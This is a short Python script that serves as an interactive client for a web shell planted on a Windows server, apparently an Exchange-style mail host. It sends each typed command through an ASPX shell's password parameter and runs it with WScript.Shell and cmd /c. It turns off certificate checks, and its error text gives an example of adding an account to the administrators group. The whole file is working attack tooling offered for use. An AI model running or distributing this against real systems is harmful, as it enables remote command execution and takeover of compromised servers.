import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import sys
if len(sys.argv) < 3:
	print('\r\n--------------------\n+ Author: github.com/Udyz\n+ twitter.com/lotusdll\n--------------------\n[*] USAGE: ./{file} <shell url> <password>\nex: ./{file} https://mail.local/aspnet_client/shell.aspx exec_code'.format(file=sys.argv[0]))
	exit()
url = sys.argv[1]
code = sys.argv[2]
try:
	while True:
		cmd = input('CMD: ')
		shell_body_exec = '%s=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c %s").stdout.readall());'%(code, cmd)
		shell_req = requests.post('%s'%(url),headers={'Content-Type': 'application/x-www-form-urlencoded'},data=shell_body_exec,verify=False, timeout=10)
		if shell_req.status_code == 200:
			print(shell_req.text.split('Name                            :')[0])
		elif shell_req.status_code == 500:
			print('(-) AV block exec cmd or you missing \\" ex: net localgroup \\"administrators\\" mrr0b0t /add')
		else:
			print('(-) Something wrong IDK ~~')
except(requests.ConnectionError, requests.ConnectTimeout, requests.ReadTimeout):
	exit(0)
except KeyboardInterrupt:
	exit(0)
